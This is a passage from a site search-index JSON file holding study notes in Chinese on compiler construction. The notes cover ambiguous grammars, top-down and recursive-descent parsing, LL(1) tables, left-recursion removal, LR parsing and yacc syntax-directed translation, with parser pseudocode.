<p>\u901a\u8fc7\u6700\u5de6\u63a8\u5bfc\u3001\u6700\u6709\u63a8\u5bfc\u548c\u5176\u4ed6\u63a8\u5bfc\uff0c\u90fd\u53ef\u4ee5\u63a8\u5bfc\u51fa\u76f8\u540c\u7684\u4e32\uff0c\u4f46\u5374\u6709\u4e0d\u540c\u7684\u5206\u6790\u6811\u3002</p> <p>\u5206\u6790\u6811\u7684\u542b\u4e49\u53d6\u51b3\u4e8e\u6811\u7684\u540e\u5e8f\u904d\u5386\uff0c\u6b64\u65f6\uff0c\u4e0d\u540c\u7684\u5206\u6790\u6811\u7684\u542b\u4e49\u4e0d\u540c\uff0c\u751a\u81f3\u9519\u8bef\u3002</p> <p>\u7ed9\u5b9a\u6587\u6cd5 G\uff0c\u5982\u679c\u5b58\u5728\u53e5\u5b50 s\uff0c\u5b83\u6709\u4e24\u9897\u4e0d\u540c\u7684\u5206\u6790\u6811\uff0c\u90a3\u4e48\u79f0 G \u662f \u4e8c\u4e49\u6027\u6587\u6cd5\u3002</p> <p>\u4ece\u7f16\u8bd1\u5668\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u4e8c\u4e49\u6027\u6587\u6cd5\u5b58\u5728\u4e0b\u8ff0\u95ee\u9898\uff1a</p> <ul> <li>\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4f1a\u6709\u4e0d\u540c\u7684\u542b\u4e49</li> <li>\u56e0\u6b64\u7a0b\u5e8f\u8fd0\u884c\u7684\u7ed3\u679c\u4e0d\u662f\u552f\u4e00\u7684\u3002</li> </ul> <p>\u53ef\u4ee5\u901a\u8fc7 \u6587\u6cd5\u91cd\u5199 \u6765\u89e3\u51b3\u4e8c\u4e49\u6027\u95ee\u9898\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_33","title":"\u81ea\u9876\u5411\u4e0b\u5206\u6790","text":"<p>\u8bed\u6cd5\u5206\u6790\u7684\u76ee\u7684\u662f\uff0c\u7ed9\u5b9a\u6587\u6cd5 G \u548c\u53e5\u5b50 s\uff08\u8bb0\u53f7\u6d41\uff09\uff0c\u56de\u7b54 s \u662f\u5426\u80fd\u4ece G \u63a8\u5bfc \u51fa\u6765\u3002</p> <p>\u81ea\u9876\u5411\u4e0b\u5206\u6790\uff0c\u5c31\u662f\u4e3a\u4e86\u5b9e\u73b0\u8bed\u6cd5\u5206\u6790\u7684\u76ee\u7684\u3002\u5176\u7b97\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u662f\uff1a</p> <ul> <li>\u4ece G \u7684\u5f00\u59cb\u7b26\u53f7\u51fa\u53d1\uff0c\u968f\u610f\u63a8\u5bfc\u51fa\u67d0\u4e2a\u53e5\u5b50 t\uff0c\u6bd4\u8f83 t \u548c\u76ee\u6807\u53e5\u5b50 s\uff1a</li> <li>\u82e5 t==s\uff0c\u5219\u8bed\u6cd5\u5206\u6790\u56de\u7b54\uff1ayes</li> <li>\u82e5 t!=s\uff0c\u5219\u91cd\u65b0\u968f\u610f\u63a8\u5bfc\uff0c\u82e5\u6240\u6709\u63a8\u5bfc\u7ed3\u679c\u90fd\u662f t!=s\uff0c\u5219\u8bed\u6cd5\u5206\u6790\u56de\u7b54\uff1ano</li> </ul> <pre><code>// \u6587\u6cd5G\nS -&gt; N V N\nN -&gt; s|t|g|w\nV -&gt; e|d\n\n// \u53e5\u5b50s\ng d w\n\n// \u56de\u7b54\nyes\n</code></pre> <p>\u5176\u7b97\u6cd5\u7684\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>tokens[];   // \u53e5\u5b50s\uff0c\u5373\u6240\u6709\u7684\u8bb0\u53f7\u3002\u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0ctokens = [g,d,w]\ni=0;\nstack=[S];  // \u975e\u7ec8\u7ed3\u7b26S\u662f\u5f00\u59cb\u7b26\u53f7\nwhile(stack!=[])\n{\n  if(stack[top] is a terminal t)\n  {\n    if(t==tokens[i++])\n      pop();   // \u5982\u679c\u63a8\u5bfc\u7684\u7ec8\u7ed3\u7b26\u548c\u53e5\u5b50s\u76f8\u540c\uff0c\u5219\u5f39\u51fa\u8be5\u7ec8\u7ed3\u7b26\uff0c\u5e76\u4e14i++\u3002\u8868\u793a\u5df2\u5339\u914d\uff0c\u4f8b\u5982N-&gt;g\uff0c\u6b64\u65f6\u548ctokens[0],\u4e5f\u5c31\u662fg\u76f8\u540c\u3002\n    else\n      backtrack();         // \u56de\u6eaf\u3002\u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c\u53e5\u5b50s\u662fg d w\uff0c\u7b2c\u4e00\u6b21\u63a8\u5bfcN-&gt;s\u548cN-&gt;t\u90fd\u4e0d\u5339\u914d\uff0c\u56de\u6eaf\u3002\u76f4\u5230\u9009\u62e9N-&gt;g\u7684\u63a8\u5bfc\u3002\n  }\n  else if(stack[top] is a nonterminal T)\n  {\n    // \u5982\u679c\u662f\u7ec8\u7ed3\u7b26\uff0c\u5219\u5c06\u4ea7\u751f\u5f0f\u7684\u53f3\u90e8\u538b\u5165\u6808\u4e2d\u3002\n    // \u4f8b1  \u9047\u5230\u975e\u7ec8\u7ed3\u7b26S\uff0c\u9009\u62e9\u4ea7\u751f\u5f0fS -&gt; N V N\u3002\u6b64\u65f6stack=[S]\uff0c\u56e0\u6b64\u5148pop(S),\u7136\u540e\u5c06N V N\u538b\u5165\u6808\u4e2d\u3002\n    //      \u6ce8\u610f\uff0cS -&gt; N1 V N2,\u538b\u5165\u6808\u540e\uff0cN1\u5e94\u8be5\u5728\u6808\u9876\u3002\n    // \u4f8b2 \u9047\u5230\u975e\u7ec8\u7ed3\u7b26N\uff0c\u5176\u4ea7\u751f\u5f0f\u6709\u56db\u4e2a\uff0c\u9996\u5148\u9009\u62e9\u7b2c\u4e00\u4e2a\u4ea7\u751f\u5f0f N-&gt;s\uff0c\u6b64\u65f6\u5f39\u51faN\uff0c\u538b\u5165s\u3002\n    //     \u663e\u7136\u4e0d\u5339\u914d\uff0c\u56e0\u6b64\u56de\u6eaf\uff0c\u9009\u62e9\u4e0b\u4e00\u4e2a\u4ea7\u751f\u5f0fN-&gt;t\u3002\u5982\u6b64\u4f9d\u6b21\u5c1d\u8bd5\u3002\n    pop();\n    push(the next right hand side of T)\n  }\n}\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u4e00\u4e2a\u4e25\u91cd\u7684\u6027\u80fd\u95ee\u9898\uff0c\u4e5f\u5c31\u662f<code>backtrack()</code>\u56de\u6eaf\uff0c\u6bd4\u5982\u9009\u4e2d\u6b63\u786e\u7684 N-&gt;g \u7684\u4ea7\u751f\u5f0f\u65f6\uff0c\u9700\u8981\u4e24\u6b21\u56de\u6eaf\u3002</p> <p>\u4e3a\u4e86\u4fdd\u8bc1\u7f16\u8bd1\u5668\u7684\u9ad8\u6548\uff0c\u9700\u8981\u7ebf\u6027\u65f6\u95f4\u7684\u7b97\u6cd5\uff0c\u53ef\u4ee5\u907f\u514d\u56de\u6eaf\uff0c\u5f15\u51fa\u81ea\u9876\u5411\u4e0b\u5206\u6790\u5e38\u7528\u7684\u4e24\u4e2a\u7b97\u6cd5\uff1a</p> <ul> <li>\u9012\u5f52\u4e0b\u964d\u5206\u6790\u7b97\u6cd5\uff08\u9884\u6d4b\u5206\u6790\u7b97\u6cd5\uff09</li> <li>LL(1)\u5206\u6790\u7b97\u6cd5</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_34","title":"\u9012\u5f52\u4e0b\u964d\u5206\u6790\u7b97\u6cd5","text":"<p>\u53c8\u79f0\u4e3a\u9884\u6d4b\u5206\u6790\u7b97\u6cd5\uff0c\u8be5\u7b97\u6cd5\u9ad8\u6548\u3001\u6613 \u624b\u5de5\u5b9e\u73b0\u7f16\u7801\u3001\u9519\u8bef\u5b9a\u4f4d\u548c\u8bca\u65ad\u4fe1\u606f\u51c6\u786e\uff0c\u56e0\u6b64\u88ab\u5982 GCC 4.0\u3001LLVM \u7b49\u5f00\u6e90\u548c\u5546\u4e1a\u7684\u7f16\u8bd1\u5668\u6240\u91c7\u7528\u3002</p> <p>\u7b97\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u5982\u4e0b\uff1a</p> <ul> <li>\u6bcf\u4e2a\u7ec8\u7ed3\u7b26\u6784\u9020\u4e00\u4e2a\u5206\u6790\u51fd\u6570</li> <li>\u7528\u524d\u770b\u7b26\u53f7\u6307\u5bfc\u4ea7\u751f\u5f0f\u89c4\u5219\u7684\u9009\u62e9</li> </ul> <p>\u4ecd\u65e7\u4ee5\u4e0a\u8ff0\u7684\u6587\u6cd5\u7684\u53e5\u5b50\u4e3a\u4f8b\uff0c\u5176\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>parse_S()\n{\n  parse_N();\n  parse_V();\n  parse_N();\n}\n\nparse_N()\n{\n  token = tokens[i++];\n  if(token==s||token==t||token==g||token==w)\n    return\n  error(\"\u89e3\u6790\u5931\u8d25\");\n}\n</code></pre> <p>\u6b64\u5904\u4f7f\u7528\u524d\u770b\u7b26\u53f7\uff0c\u53d6\u51fa\u5bfb\u627e\u7684\u76ee\u6807\u5339\u914d\u5143\u7d20 token\uff0c\u7136\u540e\u5bfb\u627e\u4ea7\u751f\u5f0f\u4e2d\u662f\u5426\u5b58\u5728\u8be5 token\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#ll1_1","title":"LL(1)\u5206\u6790\u7b97\u6cd5","text":"<p>\u9012\u5f52\u5411\u4e0b\u5206\u6790\u7b97\u6cd5\uff0c\u4e3b\u8981\u7528\u4e8e\u624b\u5de5\u5b9e\u73b0\u7f16\u8bd1\u5668\u7684\u8bed\u6cd5\u5206\u6790\u5668\uff0c\u800c LL(1)\u5206\u6790\u7b97\u6cd5\uff0c\u4e3b\u8981\u7528\u4e8e \u81ea\u52a8\u751f\u6210 \u8bed\u6cd5\u5206\u6790\u5668\u3002</p> <p>\u548c\u81ea\u52a8\u751f\u6210\u8bcd\u6cd5\u5206\u6790\u5668\u7c7b\u4f3c\uff0c\u81ea\u52a8\u751f\u6210\u8bed\u6cd5\u5206\u6790\u5668\u4e5f\u9700\u8981\u8f93\u5165\u4e00\u4e9b\u58f0\u660e\u5f0f\u89c4\u8303\uff0c\u8fd9\u4e2a\u89c4\u8303\u4e00\u822c\u662f\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u6cd5\uff08CFG\uff09\u3002</p> <p>LL(1)\u5206\u6790\u7b97\u6cd5\u662f\u8bed\u6cd5\u751f\u6210\u5de5\u5177\u53ef\u4ee5\u9009\u7528\u7684\u7b97\u6cd5\u4e4b\u4e00\uff0c\u91c7\u7528 LL(1)\u5206\u6790\u7b97\u6cd5\u7684\u8bed\u6cd5\u5206\u6790\u5668\u751f\u6210\u5de5\u5177\u5982 ANTLA\uff0c\u5b83\u901a\u8fc7\u63a5\u53d7\u8bed\u6cd5\u5b9a\u4e49\uff0c\u751f\u6210\u8bed\u6cd5\u5206\u6790\u5668\u3002</p> <p>\u5f53\u4f7f\u7528 LL(1)\u5206\u6790\u7b97\u6cd5\u65f6\uff0c\u901a\u8fc7\u626b\u63cf CFG \u5f97\u5230\u4e00\u4e2a\u9884\u6d4b\u5206\u6790\u8868\uff0c\u7136\u540e\u5728\u914d\u5408\u9a71\u52a8\u8fd9\u4e2a\u8868\u7684\u7a0b\u5e8f\u4ee3\u7801\uff0c\u5373\u53ef\u751f\u6210\u8bed\u6cd5\u5206\u6790\u5668\u3002</p> <p>LL(1)\u5206\u6790\u7b97\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u662f\uff1a\u8868\u9a71\u52a8\u7684\u5206\u6790\u7b97\u6cd5\uff1a</p> <ul> <li>\u7b2c\u4e00\u4e2a L\uff1a\u8868\u793a\u4ece\u5de6\u5230\u53f3\u626b\u63cf\u8f93\u5165</li> <li>\u7b2c\u4e8c\u4e2a L\uff1a\u8868\u793a\u6700\u5de6\u63a8\u5bfc</li> <li>1\uff1a\u8868\u793a\u6bcf\u4e00\u6b65\u4e2d\u53ea\u9700\u8981\u5411\u524d\u770b\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7\u6765\u51b3\u5b9a\u8bed\u6cd5\u5206\u6790\u52a8\u4f5c</li> </ul> <p></p> <p>\u5176\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>tokens[];\ni=0;\nstack=[S];\nwhile(stack!=[])\n{\n  if(stack[top] is a terminal t)\n  {\n    if(t==tokens[i++])\n      pop();\n    else\n      // \u81ea\u9876\u5411\u4e0b\u5206\u6790\uff1abacktrack();\n      error(\"...\")  // LL(1)\u5206\u6790\n  }\n  else if(stack[top] is a nonterminal T)\n  {\n\n    pop();\n    // \u81ea\u9876\u5411\u4e0b\u5206\u6790\uff1apush(the next right hand side of T)\n    push(the correct right hand side of T by table[N,T]) // LL(1)\u5206\u6790\n  }\n}\n</code></pre> <p>\u6839\u636e\u6539\u4ee3\u7801\uff0cLL(1)\u7b97\u6cd5\u76f8\u8f83\u4e8e\u81ea\u9876\u5411\u4e0b\u5206\u6790\u7684\u7b97\u6cd5\uff0c\u6539\u52a8\u7684\u5730\u65b9\u4e3b\u8981\u5982\u4e0b\uff1a</p> <ul> <li>\u5f53\u9047\u5230\u975e\u7ec8\u7ed3\u7b26\u65f6\uff0c\u4e0d\u662f\u4f9d\u6b21\u9009\u62e9\u4ea7\u751f\u5f0f\uff0c\u4e0d\u505c\u7684\u5c1d\u8bd5-\u56de\u6eaf\u3002\u800c\u662f\u76f4\u63a5\u901a\u8fc7 \u9884\u6d4b\u5206\u6790\u8868\uff0c\u627e\u5230\u6b63\u786e\u7684\u8868\u8fbe\u5f0f\uff0c\u5c06\u5176\u53f3\u90e8\u538b\u5165\u6808\u4e2d\u3002</li> <li>\u7531\u4e8e\u6bcf\u6b21\u8981\u4e48\u627e\u5230\u6b63\u786e\u7684\u4ea7\u751f\u5f0f\uff0c\u8981\u4e48\u627e\u4e0d\u5230\u3002\u56e0\u6b64\u65e0\u9700\u56de\u6eaf\uff01\u5f53\u627e\u4e0d\u5230\u65f6\uff0c\u76f4\u63a5\u62a5\u9519\u5373\u53ef\u3002</li> </ul> <p>\u4e3a\u4e86\u6784\u5efa\u9884\u6d4b\u5206\u6790\u8868\uff0c\u9996\u5148\u9700\u8981\u6784\u5efa\u4e24\u4e2a\u96c6\u5408\uff1a</p> <ul> <li>FIRST \u96c6</li> <li>FOLLOW \u96c6</li> </ul> <p>\u57fa\u4e8e\u8fd9\u4e24\u4e2a\u96c6\u5408\u6784\u5efa\u51fa SELECT \u96c6\u5408\uff0c\u57fa\u4e8e SELECT \u96c6\u5408\u6784\u5efa\u51fa\u9884\u6d4b\u5206\u6790\u8868\u3002\u8be6\u7ec6\u5185\u5bb9\u53c2\u89c1LL(1)\u6587\u6cd5</p> <p>\u4e0a\u8ff0\u793a\u4f8b\u7684\u9884\u6d4b\u5206\u6790\u8868\u5982\u4e0b\uff1a</p> <p></p> <ul> <li>\u5f53 \u524d\u770b\u7b26\u53f7 \u662f s \u7684\u65f6\u5019\uff0c\u5982\u679c\u6808\u9876\u7684\u975e\u7ec8\u7ed3\u7b26\u662f S\uff0c\u5219\u5c06\u4ea7\u751f\u5f0f 0 \u7684\u53f3\u90e8\u538b\u5165\u6808\u4e2d</li> <li>\u5f53 \u524d\u770b\u7b26\u53f7 \u662f t \u7684\u65f6\u5019\uff0c\u5982\u679c\u6808\u9876\u7684\u975e\u7ec8\u7ed3\u7b26\u662f N\uff0c\u5219\u5c06\u4ea7\u751f\u5f0f 2 \u7684\u53f3\u90e8\u538b\u5165\u6808\u4e2d</li> <li>...</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#ll1_2","title":"LL(1)\u5206\u6790\u51b2\u7a81\u5904\u7406","text":"<p>\u4e0b\u9762\u4e24\u4e2a\u95ee\u9898\u4f1a\u5bfc\u81f4 LL(1)\u6784\u5efa\u7684\u9884\u6d4b\u5206\u6790\u8868\u6709\u51b2\u7a81\uff0c\u800c\u5bfc\u81f4\u56de\u6eaf\u3002</p> <p>\u95ee\u9898\u4e00</p> <pre><code>\u6587\u6cd5G\nS \u2192 cA | cB\nA \u2192 a\nB \u2192 b\n\u8f93\u5165\nc b\n</code></pre> <p>\u540c\u4e00\u975e\u7ec8\u7ed3\u7b26\u7684\u591a\u4e2a\u5019\u9009\u5f0f\u5b58\u5728\u5171\u540c\u524d\u7f00\uff0c\u5c06\u5bfc\u81f4\u56de\u6eaf\u73b0\u8c61\u3002</p> <p>\u5982\u4e0a\u8ff0\u6587\u6cd5\uff0c\u8f93\u5165 cb\uff0c\u81ea\u9876\u5411\u4e0b\u6700\u5de6\u63a8\u5bfc\uff0c\u9996\u5148\u8fdb\u5165 c\uff0c\u7136\u540e\u9009\u62e9 A\uff0cA \u4ea7\u751f\u5f0f\u4ec5\u6709 a\uff0c\u56e0\u6b64\u56de\u6eaf\uff0c\u9009\u62e9 B\uff0c</p> <p>\u6b63\u786e\u3002</p> <p>\u95ee\u9898\u4e8c</p> <pre><code>\u6587\u6cd5G1 \u76f4\u63a5\u5de6\u9012\u5f52\nA \u2192 Aa|b\n\n\u6587\u6cd5G2 \u95f4\u63a5\u5de6\u9012\u5f52\n\nS \u2192 Aa|b\nA \u2192 Sc\n</code></pre> <p>\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u4e2d\u6709\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26 A \u4f7f\u5f97\u5bf9\u67d0\u4e2a\u4e32 \u03b1 \u5b58\u5728\u4e00\u4e2a\u63a8\u5bfc A \u21d2<sup>+</sup>A\u03b1 \uff0c\u90a3\u4e48\u8fd9\u4e2a\u6587\u6cd5\u5c31\u662f\u5de6\u9012\u5f52\u7684\u3002</p> <p>\u4e0a\u8ff0\u4e24\u4e2a\u6587\u6cd5\u5206\u522b\u662f\u76f4\u63a5\u5de6\u9012\u5f52\u548c\u95f4\u63a5\u5de6\u9012\u5f52\uff0c\u4f1a\u5bfc\u81f4\u6700\u5de6\u63a8\u5bfc\u65f6\u51fa\u73b0\u65e0\u9650\u5faa\u73af\u3002</p> <p>\u6d88\u9664\u5de6\u9012\u5f52\u7684\u65b9\u5f0f\u5c31\u662f\u5c06\u5de6\u9012\u5f52\u66ff\u6362\u6210\u53f3\u9012\u5f52\u3002</p> <pre><code>\u6587\u6cd5G3 \u5de6\u9012\u5f52\nA \u2192 A\u03b1|\u03b2(\u03b1\u2260\u7a7a\u4e32\u03b5\uff0c\u03b2\u4e0d\u4ee5A\u5f00\u5934)\n</code></pre> <p>\u4e0a\u8ff0\u6587\u6cd5\u7684\u6b63\u5219\u8868\u8fbe\u5f0f r \u4e3a \u03b2\u03b1<sup>*</sup>\uff0c\u6784\u5efa\u5176\u5bf9\u5e94\u7684\u7b49\u4ef7\u53f3\u9012\u5f52\u6587\u6cd5\u4e3a\uff1a</p> <pre><code>\u6587\u6cd5G4 \u53f3\u9012\u5f52\nA \u2192 \u03b2A\u2032\nA\u2032 \u2192 \u03b1A\u2032\uff5c\u03b5\n</code></pre> <p>\u8f6c\u6362\u7684\u4ee3\u4ef7\u662f\u5f15\u5165\u4e86\u65b0\u7684\u975e\u7ec8\u7ed3\u7b26\u548c\u7a7a\u4e32 \u03b5\u3002</p> <p></p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_35","title":"\u81ea\u5e95\u5411\u4e0a\u5206\u6790","text":"<p>LL(1)\u5177\u6709\u8fd0\u884c\u9ad8\u6548\u3001\u6709\u73b0\u6210\u5de5\u5177\u53ef\u7528\u7684\u4f18\u70b9\uff0c\u4f46\u4e5f\u6709\u4e24\u4e2a\u8f83\u4e3a\u4e25\u91cd\u7684\u7f3a\u9677\uff1a</p> <ul> <li>\u80fd\u5206\u6790\u7684\u6587\u6cd5\u7c7b\u578b\u53d7\u9650\uff0c\u5f88\u591a\u6587\u6cd5\u90fd\u5206\u6790\u4e0d\u4e86</li> <li>\u5373\u4fbf\u662f\u80fd\u5206\u6790\u7684\u6587\u6cd5\uff0c\u7531\u4e8e\u5206\u6790\u8868\u4e2d\u4e0d\u80fd\u51fa\u73b0\u51b2\u7a81\uff0c\u5f80\u5f80\u9700\u8981 \u6539\u5199\u6587\u6cd5\u3002\u4e14\u6539\u5199\u540e\u7684\u6587\u6cd5\u5f80\u5f80\u53d8\u5f97\u590d\u6742\u4e14\u4e0d\u76f4\u89c2\u3002</li> </ul> <p>\u81ea\u5e95\u5411\u4e0a\u5206\u6790\u7b97\u6cd5\u53ef\u4ee5\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\uff0c\u5728\u6b64\u4ec5\u7814\u7a76\u5176\u4e2d\u6700\u91cd\u8981\u4e14\u5e94\u7528\u6700\u5e7f\u6cdb\u7684\u7b97\u6cd5\uff1aLR \u5206\u6790\u7b97\u6cd5\uff0c\u53c8\u79f0\u79fb\u5165-\u89c4\u7ea6\u7b97\u6cd5\u3002</p> <p>LR \u5206\u6790\u7b97\u6cd5\u5728\u517c\u5177\u8fd0\u884c\u9ad8\u6548\u3001\u6709\u73b0\u6210\u5de5\u5177\u53ef\u7528\u7684\u4f18\u70b9\u540c\u65f6\uff0c\u76f8\u5bf9\u4e8e LL(1)\u8fd8\u62e5\u6709\u5982\u4e0b\u4f18\u52bf\uff1a</p> <ul> <li>\u66f4\u5927\u7684\u6587\u6cd5\u5206\u6790\u8303\u56f4</li> <li>\u4e0d\u9700\u8981\u5bf9\u6587\u6cd5\u8fdb\u884c\u6539\u5199</li> </ul> <p>LR \u5206\u6790\u7b97\u6cd5\u4e5f\u662f\u76ee\u524d\u5e94\u7528\u5e7f\u6cdb\u7684\u4e00\u7c7b\u8bed\u6cd5\u5206\u6790\u5668\u7684\u81ea\u52a8\u751f\u6210\u5668\u4e2d\u91c7\u7528\u7684\u7b97\u6cd5\uff0c\u4f8b\u5982 YACC\u3001bison\u3001CUP\u3001C#yacc \u7b49\u90fd\u91c7\u7528\u4e86\u8be5\u7b97\u6cd5\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#lr0","title":"LR(0)\u5206\u6790\u7b97\u6cd5","text":"<ul> <li>\u7b2c\u4e00\u4e2a L\uff1a\u8868\u793a\u4ece\u5de6\u5230\u53f3\u626b\u63cf\u8f93\u5165</li> <li>\u7b2c\u4e8c\u4e2a R\uff1a\u8868\u793a\u6700\u53f3\u63a8\u5bfc\uff0c\u5b9e\u9645\u4e0a\u662f\u6700\u53f3\u63a8\u5bfc\u7684\u9006\u8fc7\u7a0b\uff0c\u5373\u6700\u5de6\u89c4\u7ea6\u3002</li> </ul> <p>\u4e3a\u4e86\u65b9\u4fbf\u6807\u8bb0\u8bed\u6cd5\u5206\u6790\u5668\u5df2\u7ecf\u8bfb\u5165\u4e86\u591a\u5c11\u8f93\u5165\uff0c\u5f15\u5165\u70b9\u8bb0\u53f7\u3002</p> <pre><code>// \u5df2\u7ecf\u8bfb\u5165\u4e86E+3\uff0c*4\u8fd8\u672a\u8bfb\u5165\u3002\nE+3\u00b7*4\n</code></pre> <p>\u8be5\u7b97\u6cd5\u4e3b\u8981\u662f\u4ee5\u4e0b\u4e24\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u79fb\u8fdb\uff1a\u8bfb\u5165\u4e00\u4e2a\u8bb0\u53f7\uff0c\u538b\u5165\u6808\u9876</li> <li>\u89c4\u7ea6\uff1a\u6808\u9876\u4e0a\u7684 n \u4e2a\u7b26\u53f7\uff08\u67d0\u4ea7\u751f\u5f0f\u7684\u53f3\u90e8\uff09\uff0c\u89c4\u7ea6\u4e3a\u5de6\u90e8\u7684\u975e\u7ec8\u7ed3\u7b26\u3002</li> <li>\u4f8b\u5982\u5bf9\u4ea7\u751f\u5f0f A-&gt;\u03b21 ... \u03b2n<ul> <li>\u5982\u679c \u03b21 ... \u03b2n \u5728\u6808\u9876\u4e0a\uff0c\u5219 \u03b21 ... \u03b2n \u5168\u90e8\u5f39\u51fa</li> <li>\u538b\u5165 A</li> </ul> </li> </ul> <p>\u8be5\u7b97\u6cd5\u7684\u6838\u5fc3\u95ee\u9898\u662f\uff1a\u5982\u4f55\u786e\u5b9a\u79fb\u8fdb\u548c\u89c4\u7ea6\u7684\u65f6\u673a\uff1f</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#slr","title":"SLR \u5206\u6790\u7b97\u6cd5","text":"<p>LR \u7b97\u6cd5\u5b58\u5728\u4e24\u4e2a\u95ee\u9898\uff1a</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#lr1","title":"LR(1)\u5206\u6790\u7b97\u6cd5","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#lr1-yacc","title":"LR(1)\u5206\u6790\u5de5\u5177\uff08\u4ee5 yacc \u4e3a\u4f8b\uff09","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_36","title":"\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1","text":"<p>\u4f20\u7edf\u7684\u8bed\u6cd5\u5206\u6790\u7684\u5de5\u4f5c\u4e3b\u8981\u662f\u63a5\u53d7\uff1a</p> <ul> <li>\u8bcd\u6cd5\u5206\u6790\u7684\u8bb0\u53f7\u6d41</li> <li>\u7f16\u8bd1\u8bed\u8a00\u7684\u8bed\u6cd5\u89c4\u5219</li> </ul> <p>\u56de\u7b54\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5e76\u751f\u6210\u8bed\u6cd5\u6811\u3002</p> <p>\u4f46\u662f\uff0c\u7f16\u8bd1\u5668\u5728\u505a\u8bed\u6cd5\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\uff0c\u9664\u4e86\u56de\u7b54\u7a0b\u5e8f\u8bed\u6cd5\u662f\u5426\u5408\u6cd5\u5916\uff0c\u8fd8\u5fc5\u987b\u5b8c\u6210\u540e\u7eed\u5de5\u4f5c\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u7c7b\u578b\u68c0\u67e5</li> <li>\u76ee\u6807\u4ee3\u7801\u751f\u6210</li> <li>\u4e2d\u95f4\u4ee3\u7801\u751f\u6210</li> </ul> <p>\u8fd9\u4e9b\u540e\u7eed\u5de5\u4f5c\u4e00\u822c\u53ef\u4ee5\u901a\u8fc7\u8bed\u6cd5\u5236\u5bfc\u7684\u7ffb\u8bd1\u5b8c\u6210\u3002</p> <p>\u901a\u8fc7\u7ed9\u6bcf\u6761\u4ea7\u751f\u5f0f\u89c4\u5219\u9644\u52a0\u4e00\u4e2a\u8bed\u4e49\u52a8\u4f5c\uff08\u901a\u5e38\u662f\u4ee3\u7801\u7247\u6bb5\uff09\uff0c\u8be5\u8bed\u4e49\u52a8\u4f5c\u5728\u4ea7\u751f\u5f0f<code>\u5f52\u7ea6</code>\u65f6\u6267\u884c\u3002</p> <pre><code>line: exp '\\n'      {printf(\"value=%d\\n\", $1);}\n\nexp:n               {$$=$1;}\n    | exp '+' exp   {$$=$1+$3;}\n;\n</code></pre> <p>\u4e0a\u8ff0 yacc \u7684\u4ee3\u7801\u7684\u5de6\u4fa7\u662f\u4ea7\u751f\u5f0f\u89c4\u5219\uff0c\u53f3\u4fa7<code>{}</code>\u4e2d\u7684\u5185\u5bb9\u5c31\u662f\u8bed\u4e49\u52a8\u4f5c\uff0c\u5c06\u5728\u4ea7\u751f\u5f0f<code>\u5f52\u7ea6</code>\u65f6\u6267\u884c\u3002</p> <p>\u5b9e\u73b0\u539f\u7406</p> <pre><code>## \u4ea7\u751f\u5f0f 